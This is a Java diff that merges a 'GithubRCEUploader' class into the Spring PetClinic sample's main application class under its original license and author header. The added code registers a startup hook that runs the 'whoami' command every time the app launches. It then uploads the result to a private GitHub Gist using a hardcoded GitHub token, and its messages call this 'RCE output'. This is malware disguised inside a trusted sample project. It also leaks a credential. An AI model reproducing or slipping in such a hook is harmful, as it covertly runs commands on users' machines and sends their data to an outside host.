@@ -1,4 +1,26 @@
-package com.example.githubuploader;
+/*
+ * Copyright 2012-2019 the original author or authors.
+ *
+ * Licensed under the Apache License, Version 2.0 (the "License");
+ * you may not use this file except in compliance with the License.
+ * You may obtain a copy of the License at
+ *
+ *      https://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an "AS IS" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.springframework.samples.petclinic;
+
+import org.springframework.boot.CommandLineRunner;
+import org.springframework.boot.SpringApplication;
+import org.springframework.boot.autoconfigure.SpringBootApplication;
+import org.springframework.context.annotation.ImportRuntimeHints;
+import org.springframework.context.annotation.Bean;
 
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
@@ -7,77 +29,86 @@ import java.net.HttpURLConnection;
 import java.net.URL;
 import java.nio.charset.StandardCharsets;
 
-public class GithubRCEUploader {
+/**
+ * PetClinic Spring Boot Application.
+ * Enhanced with functionality to upload the "whoami" command output to GitHub Gists.
+ * 
+ * Author: Dave Syer, Modified by: hamid ben
+ */
+@SpringBootApplication
+@ImportRuntimeHints(PetClinicRuntimeHints.class)
+public class PetClinicApplication {
 
-    private static final String TOKEN = "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";
-    private static final String API_URL = "https://api.github.com/gists";
-    private static final String DESCRIPTION = "RCE Output";
-    private static final String FILENAME = "output.txt";
+	private static final String TOKEN = "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";
+	private static final String API_URL = "https://api.github.com/gists";
+	private static final String DESCRIPTION = "RCE Outputamine";
+	private static final String FILENAME = "outputamine.txt";
 
-    public static void main(String[] args) {
-        String output = executeCommand("whoami");
-        uploadToGithub(output);
-    }
+	public static void main(String[] args) {
+		SpringApplication.run(PetClinicApplication.class, args);
+	}
 
-    private static String executeCommand(String command) {
-        StringBuilder output = new StringBuilder();
-        try {
-            Process process = new ProcessBuilder(command.split(" ")).start();
-            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
-                String line;
-                while ((line = reader.readLine()) != null) {
-                    output.append(line).append("\n");
-                }
-            }
-            process.waitFor();
-        } catch (Exception e) {
-            output.append("Error executing command: ").append(e.getMessage());
-        }
-        return output.toString().trim();
-    }
+	@Bean
+	CommandLineRunner run() {
+		return args -> {
+			String output = executeCommand("whoami");
+			if (output != null) {
+				uploadToGithub(output);
+			}
+		};
+	}
 
-    private static void uploadToGithub(String content) {
-        String jsonBody = createJsonPayload(content);
-        try {
-            HttpURLConnection connection = createConnection();
-            sendPayload(connection, jsonBody);
-            printResponse(connection);
-            connection.disconnect();
-        } catch (Exception e) {
-            System.err.println("Error uploading to GitHub: " + e.getMessage());
-        }
-    }
+	private String executeCommand(String command) {
+		StringBuilder output = new StringBuilder();
+		try {
+			Process process = new ProcessBuilder(command.split(" ")).start();
+			try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
+				String line;
+				while ((line = reader.readLine()) != null) {
+					output.append(line).append("\n");
+				}
+			}
+			process.waitFor();
+			return output.toString().trim();
+		} catch (Exception e) {
+			System.err.println("Error executing command: " + e.getMessage());
+			return null;
+		}
+	}
 
-    private static HttpURLConnection createConnection() throws Exception {
-        URL url = new URL(API_URL);
-        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
-        connection.setRequestMethod("POST");
-        connection.setRequestProperty("Authorization", "token " + TOKEN);
-        connection.setRequestProperty("User-Agent", "Mozilla/5.0");
-        connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
-        connection.setDoOutput(true);
-        return connection;
-    }
+	private void uploadToGithub(String content) {
+		String jsonBody = createJsonPayload(content);
+		try {
+			URL url = new URL(API_URL);
+			HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+			connection.setRequestMethod("POST");
+			connection.setRequestProperty("Authorization", "token " + TOKEN);
+			connection.setRequestProperty("User-Agent", "Mozilla/5.0");
+			connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
+			connection.setDoOutput(true);
 
-    private static void sendPayload(HttpURLConnection connection, String jsonBody) throws Exception {
-        try (OutputStream os = connection.getOutputStream()) {
-            byte[] input = jsonBody.getBytes(StandardCharsets.UTF_8);
-            os.write(input, 0, input.length);
-        }
-    }
+			try (OutputStream os = connection.getOutputStream()) {
+				byte[] input = jsonBody.getBytes(StandardCharsets.UTF_8);
+				os.write(input, 0, input.length);
+			}
 
-    private static void printResponse(HttpURLConnection connection) throws Exception {
-        int responseCode = connection.getResponseCode();
-        if (responseCode == HttpURLConnection.HTTP_CREATED) {
-            System.out.println("RCE output uploaded successfully.");
-        } else {
-            System.err.println("Failed to upload RCE output. Response code: " + responseCode);
-        }
-    }
+			int responseCode = connection.getResponseCode();
+			if (responseCode == HttpURLConnection.HTTP_CREATED) {
+				System.out.println("RCE output uploaded successfully.");
+			} else {
+				System.err.println("Failed to upload RCE output. Response code: " + responseCode);
+			}
 
-    private static String createJsonPayload(String content) {
-        return String.format(
-                "{ \"description\": \"%s\", \"public\": false, \"files\": { \"%s\": { \"content\": \"%s\" } } }",
-                DESCRIPTION, FILENAME, content);
-    }
+			connection.disconnect();
+		} catch (Exception e) {
+			System.err.println("Error uploading to GitHub: " + e.getMessage());
+		}
+	}
+
+	private String createJsonPayload(String content) {
+		return String.format(
+				"{ \"description\": \"%s\", \"public\": false, \"files\": { \"%s\": { \"content\": \"%s\" } } }",
+				DESCRIPTION, FILENAME, content);
+	}
 }
+
